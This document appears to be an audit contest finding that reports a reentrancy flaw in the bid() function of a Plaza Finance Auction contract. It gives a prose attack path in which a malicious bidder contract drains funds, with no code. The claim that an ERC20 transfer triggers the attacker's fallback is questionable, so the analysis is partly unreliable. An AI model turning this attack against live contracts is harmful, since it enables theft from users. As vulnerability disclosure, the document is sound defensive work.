# Reentrancy Vulnerability in `bid` Function of Auction Contract

### Summary

In Auction.sol, the bid() function performs the safeTransferFrom call before updating critical state variables, violating the Checks-Effects-Interactions pattern. This creates a reentrancy vulnerability since ERC20 token transfers can execute arbitrary code before completion.

### Root Cause

In the bid function of the Auction contract, the safeTransferFrom call is made before updating the contract's state. This allows a malicious contract to re-enter the bid function via a fallback/receive function before the state is updated, enabling the attacker to place multiple bids without sufficient funds or bypassing checks.
in [Auction.sol:L121-171] (https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L121-171) 

### Internal Pre-conditions

he Auction contract must have sufficient funds in the buyCouponToken to allow transfers.

The malicious bidder must deploy a contract with a fallback function that re-enters the bid function.

The sellCouponAmount and buyReserveAmount must be within the valid range to pass the initial checks in the bid function.

### External Pre-conditions

The buyCouponToken (ERC20 token) must allow transfers and approvals.



### Attack Path

Malicious Bidder deploys a contract (MaliciousBidder) with a fallback function that re-enters the bid function.

Malicious Bidder calls the attack function, which approves the Auction contract to spend sellCouponAmount of buyCouponToken.

The attack function calls the bid function in the Auction contract with valid buyReserveAmount and sellCouponAmount.

During the execution of the bid function, the safeTransferFrom call triggers the fallback function in the MaliciousBidder contract.

The fallback function re-enters the bid function, allowing the attacker to place another bid before the state is updated.

This process repeats, allowing the attacker to place multiple bids without sufficient funds or bypassing checks.

The attacker eventually drains funds from the Auction contract by exploiting the reentrancy vulnerability.

### Impact

Can Lead to DOS attack if it bypassed `maxBids`
Funds Drain: The Auction contract can lose funds as the attacker places multiple bids without sufficient tokens.
State Corruption: The state of the Auction contract (e.g., currentCouponAmount, totalSellReserveAmount, bidCount) can be corrupted due to repeated re-entrant calls.
